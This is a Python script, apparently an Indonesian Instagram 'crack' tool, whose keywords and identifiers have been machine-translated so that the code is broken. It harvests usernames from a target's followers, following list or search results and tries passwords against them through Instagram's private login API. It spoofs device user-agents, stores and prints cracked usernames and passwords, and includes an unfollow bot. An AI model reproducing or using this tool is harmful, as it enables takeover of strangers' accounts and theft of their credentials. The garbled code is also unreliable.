#CEK HASIL IGEH
def hasil_igehh():
	mencetak('')
	untuk saya di os.listdir('IG'):
		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
	mencoba:
		c=input("\n%s•%s masukan berkas %s:%s "%(U,O,M,K))
		jika c di['']:
			exit("\n%s• isi yang benar kentod"%(M))
		g=buka("IG/%s"%(c)).baca().splitlines()
	kecuali FileNotFoundError:
		exit("\n%s• file tidak tersedia"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	untuk s dalam g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
		fol=s.split("|")[2]
		ful=s.split("|")[3]
		jika xc=="CP":
			print(f"""{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[ {K}Nama Pengguna {M}> {K}{usr}{C}
{J}║══[ {K}Kata Sandi {M}> {K}{pwd}{C}
{J}║══[ {K}Pengikut {M}> {K}{fol}{C}
{J}╚══[ {K}Mengikuti {M}> {K}{ful}{C}
			""");jeda(0,05)
		kalau tidak:
			print(f"""{J}╔══[ {H}Berhasil                      
{J}║══[ {H}Nama Pengguna {M}> {H}{usr}{C}
{J}║══[ {H}Kata Sandi {M}> {H}{pwd}{C}
{J}║══[ {H}Pengikut {M}> {H}{fol}{C}
{J}╚══[ {H}Mengikuti {M}> {H}{ful}{C}
			""");jeda(0,05)

#-------------------------------------------------#
#---{ CRACK INSTAGRAM }---#
#---------------------------------------------#
hari=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/86.0.4240.198 Seluler Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"

internal=[]
eksternal=[]
sukses=[]
pos pemeriksaan=[]
putaran=0
mengikuti=[]
s=permintaan.Sesi()

mencoba:
    # python 2
	urllib_quote_plus = urllib.quote
kecuali:
    # python3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
	pengguna=buka('.namapengguna','r').baca()
	mencoba:
		c=requests.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN })
		i=c.json()["graphql"]["pengguna"]
		nama=i["nama_lengkap"]
		followers=i["edge_followed_by"]["count"]
		berikut=i["Edge_ikuti"]["menghitung"]
		external.append(f'{nama}|{pengikut}|{mengikuti}')
	kecuali ValueError:
		print(f'{M} ! Pos Pemeriksaan Instagram');jeda(4)
		os.hapus('.kukis.log')
		os.hapus('.namapengguna')
		KELUAR()
	mengembalikan eksternal, pengguna

def checkin():
	mencoba:
		kuki=buka('.kukis.log','r').baca()
	kecuali FileNotFoundError:
		Gabung()
	ex,pengguna=cekAPI(kuki)
	kuki={'kuki':kuki}
	instagram(misal,pengguna,cookie).menu()

pasti login():
	eksternal global
	mencoba:
		os.system('hapus')
		catet_req = ('# Login dengan akun instagram anda dan pastikan akun bersifat publik. Jika login checkpoint wajib gunakan akun baru, buat akun baru lewat browser chrome')
		requ = rich.markdown.Markdown(catet_req, style='hijau')
		rich.console.Console().print(requ)
		us=input('%s%s %nama pengguna%s > %s'%(U,til,O,M,K))
		pw=stdiomask.getpass(prompt='%s%s %spassword%s > %s'%(U,til,O,M,K))
	kecuali KeyboardInterupsi:
		exit('%s ! Terhenti '%(M))
		
	x=instagramAPI(us,pw).loginAPI()
	jika x.get('status')=='berhasil':
		buka('.namapengguna','a').tulis(kami)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print ('\n%s%s Login berhasil √'%(H,til));jeda(2)
		mendaftar()
	elif x.get('status')=='pos pemeriksaan':
		exit ('\n%s%s Akun terkena sesi '%(M,til));jeda(2)
	kalau tidak:
		exit ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)

def User_Agent():
	dpi_telepon = [
		'133', '320', '515', '160', '640', '240', '120'
		'800', '480', '225', '768', '216', '1024']
	model_telepon = [
		'Nokia 2.4', 'HUAWEI', 'Galaxy',
		'Smartphone Tidak Terkunci', 'Nexus 6P',
		'Ponsel', 'Xiaomi',
		'samsung', 'OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_versi = [
		'114.0.0.20.2', '114.0.0.38.120',
		'114.0.0.20.70', '114.0.0.28.120',
		'114.0.0.0.24', '114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+ random.choice(model_phone)+'; pemancing; pemancing; en_US)'
	mengembalikan User_Agent

def user_agent():
	resolusi = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versi = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = acak.pilihan(versi)
	dpi = acak.pilihan(dpis)
	res = acak.pilihan(resolusi)
	kembali (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		acak.randint(1, 2),
		acak.randint(0, 2),
		acak.randint(10, 11),
		acak.randint(1, 3),
		acak.randint(3, 5),
		acak.randint(0, 5),
		dpi,
		soal,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	PERANGKAT = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolusi": "1080x2340","produsen": "OnePlus" ,"perangkat": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolusi": "1080x1920","produsen": "OnePlus" ,"perangkat": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "samsung" ,"device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "HUAWEI" ,"perangkat": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","produsen": "samsung" ,"device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolusi": "1080x1920","produsen": "OnePlus" ,"perangkat": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolusi": "1440x2392","produsen": " LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","produsen": " ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","produsen": " samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(daftar(DEVICES.keys()))
	app_version = PERANGKAT[DEFAULT_DEVICE]['app_version']
	android_version = PERANGKAT[DEFAULT_DEVICE]['android_version']
	android_release = PERANGKAT[DEFAULT_DEVICE]['android_release']
	dpi = PERANGKAT[DEFAULT_DEVICE]['dpi']
	resolusi = PERANGKAT[DEFAULT_DEVICE]['resolusi']
	produsen = PERANGKAT[DEFAULT_DEVICE]['produsen']
	perangkat = PERANGKAT[DEFAULT_DEVICE]['perangkat']
	model = PERANGKAT[DEFAULT_DEVICE]['model']
	cpu = PERANGKAT[DEFAULT_DEVICE]['cpu']
	kode_versi = PERANGKAT[DEFAULT_DEVICE]['kode_versi']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolusi}; {produsen}; "+f"{perangkat}; {model}; {cpu}; en_US; {version_code})"
	kembali USER_AGENT_BASE

kelas instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'produsen': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {produsen}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.namapengguna=namapengguna
		self.password=kata sandi
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(Benar)
		self.s = request.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		kembalikan 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generate_uuid = str(uuid.uuid4())
		jika (jenis):
			mengembalikan generate_uuid
		kalau tidak:
			kembali generate_uuid.replace('-', '')

	def loginAPI(diri):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Koneksi': 'tutup',
			'Menerima': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Versi=1',
			'Bahasa Terima': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(Benar),
			'_csrftoken': crf_token,
			'nama pengguna': self.nama pengguna,
			'panduan': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.memuat(x.teks)
		x_kukis=x.cookies.get_dict()
		jika "logged_in_user" di x.text:
			kuki=";".join([v+"="+x_kukis[v] untuk v di x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['nama_lengkap']
			#pn=x_jason['logged_in_user']['phone_number']
			kembalikan {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' di x.text:
			kembalikan {'status':'pos pemeriksaan'}
		kalau tidak:
			kembalikan {'status':'login_error'}
C = ''
instagram kelas:
	def __init__(self,external,username,cookie):
		self.ext=eksternal
		self.namapengguna=namapengguna
		self.cookie=cookie
		self.s=permintaan.Session()

	logo def (diri sendiri):
		os.system('hapus')
		untuk saya di luar:
			mencoba:
				nama=i.split('|')[0]
				pengikut=i.split('|')[1]
				berikut=i.split('|')[2]
			kecuali:
				lulus
		spanduk()
		cetak(f"""
{U}•{P} 01 {O}Crack dari pengikut
{U}•{P} 02 {O}Crack dari mengikuti
{U}•{P} 03 {O}Crack dari pencarian nama
{U}•{P} 04 {O}Crack secara target
{U}•{P} 05 {O}Cek status akun hasil crack
{U}•{P} 06 {O}Bot otomatis berhenti mengikuti
{U}•{P} rm {O}Hapus akun
{U}•{M} 00 {O}Keluar
	""")
	
	menu def (sendiri):
		diri.logo()
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		jika c=='':
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif c di ('1','01'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
		elif c di ('2','02'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
			self.passwordAPI(info)
		elif c di ('3','03'):
			print ("\n%s%s %sSemakin banyak target semakin banyak id yg terkumpul "%(U,til,O))
			m=int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			mencetak('')
			untuk saya dalam rentang (m):
				saya+=1
				nama=input('%s•%s %s %sMasukan nama%s > %s'%(U,P,i,O,M,K))
				nama=self.searchAPI(self.cookie,nama)
			cetak ('')
			self.passwordAPI(nama)
		elif c di ('4','04'):
			crack_target()
			KELUAR()
		elif c di ('5','05'):
			mencetak('')
			untuk saya di os.listdir('IG'):
				print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
			c=input("\n%s•%s masukan berkas %s:%s "%(U,O,M,K))
			g=buka("IG/%s"%(c)).baca().splitlines()
			print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
			print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
			print(" %s# %s---------------------------------------- %s #%s"%(P,M,P,K));jeda(2)
			print("\n%s•%s Mohon tunggu sedang mengecek akun ... "%(U,O))
			untuk s dalam g:
				usr=s.split("|")[0]
				pwd=s.split("|")[1]
				self.checkAPI(usr,pwd)
			exit("\n%s%s%s Selesai mengecek akun"%(U,til,O));jeda(0.07)
		elif c di ('6','06'):
			berikut global
			enam = 0
			print ("\n%s%s %sBot unfollow-All di jalankan "%(U,til,O))
			x=buka('.kukis.log','r').baca()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
			untuk saya dalam mengikuti:
				enam+=1
				tidur(float( acak.seragam(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print (f"{U}{til}{O} {str(six)} {i} {H}Unfollow berhasil √")
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#cetak(w)
			exit(f'\n {H}√ unfollow selesai ...')
			self.menu()
		elif c in ('rm','RM','Rm'):
			os.hapus('.kukis.log')
			os.hapus('.namapengguna')
			jalan ("\n%s%s berhasil menghapus login data "%(M,til))
			KELUAR()
		elif c di ('0','00'):
			KELUAR()
		kalau tidak:
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()

	def sixAPI(self,six_id):
		url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
		x = permintaan.dapatkan(url)
		x_jason = x.json()
		uid = str( x_jason['pengguna'][0].get("pengguna").get("pk") )
		mengembalikan uid

	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=hasilkanUUID(Benar)
		xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content
		crf_token = re.findall('{"config":{"csrf_token":"(.*)","penampil"',str(xx))[0]
		s.headers.update({'Koneksi': 'tutup',
                       'Menerima': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Versi=1',
                       'Bahasa Terima': 'en-US',
                       'User-Agent': User_Agent()})
		data = json.dumps({'_uuid': uuid,
                           '_uid': nama_nama_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(data))
		kembalikan s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text

	def searchAPI(self,cookie,nama):
		mencoba:
			x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={ "agen-pengguna":USN})
			x_jason=json.memuat(x.teks)
			untuk saya di x_jason['pengguna']:
				pengguna=i['pengguna']
				nama pengguna=pengguna['namapengguna']
				nama lengkap=pengguna['nama_lengkap']
				internal.append(f'{username}|{fullname}')
		kecuali permintaan.pengecualian.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		kembali ke dalam

	def idAPI(self,cookie,id):
		mencoba:
			m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN})
			m_jason=m.json()["graphql"]["pengguna"]
			idx=m_jason["id"]
		kecuali permintaan.pengecualian.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		kecuali Pengecualian sebagai e:
			exit('\n%s%s nama pengguna yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		kembali idx

	def infoAPI(self,cookie,api,id):
		mencoba:
			x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
			x_jason=json.memuat(x.teks)
			untuk saya di x_jason['pengguna']:
				nama pengguna = i["nama pengguna"]
				nama = i["nama_lengkap"]
				internal.append(f'{username}|{nama}')
				berikut.tambahkan(nama pengguna)
		kecuali permintaan.pengecualian.ConnectionError:
			exit('\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		kecuali Pengecualian sebagai e:
			exit('\n%s%s nama pengguna yg anda masukan salah pastikan target bersifat publik%s\n'%(M,til,N))
		kembali ke dalam

	def passwordAPI(self,xnx):
		print ("\r%s•%s Total pengguna %s> %s%s"%(U,O,M,H,len(internal)))
		cetak(f"""
{U}{til}{O} [ {U}pilih methode crack, silahkan coba satu²{O} ]

{U}{til}{P} 01 {O}Metode {M}V.1 {O}(cepat)
{U}{til}{P} 02 {O}Metode {P}V.2 {O}(lambat)
{U}{til}{P} 03 {O}Metode {H}V.3 {O}(sangat lambat)
		""")
